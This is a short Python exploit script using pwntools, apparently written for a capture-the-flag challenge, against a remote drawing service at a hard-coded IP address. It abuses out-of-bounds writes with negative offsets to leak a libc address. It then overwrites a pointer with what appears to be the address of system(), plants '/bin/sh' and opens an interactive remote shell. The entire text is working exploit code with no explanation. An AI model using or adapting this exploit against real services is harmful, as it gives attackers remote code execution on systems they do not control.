from pwn import *
s = remote("45.77.4.68",420 )
#s = remote('192.168.43.179',1234)

def plot(x,y,c):
  s.recvuntil('>')
  s.send("%d, %d, %c"%(x,y,c))
s.recvuntil('?')
s.send("1 x 1945056\n")
box = ''
for i in range(6):
  plot(0,-0x469e8+0x10+i,'A')
  box += (s.recvuntil('!')[-2:-1])
libc = u64(box+'\x00\x00')- 0x132410 #- 0x3c46a3
log.info('LIBC : 0x%x'%libc)
raw_input()
for i in range(6):
  plot(0,(-0x469e8+0x10+0x4170)+i,p64(libc+0x45390)[i:i+1])
bash = list("/bin/sh\x00")
for i in range(8):
  plot(0,i,bash[i])
s.interactive()
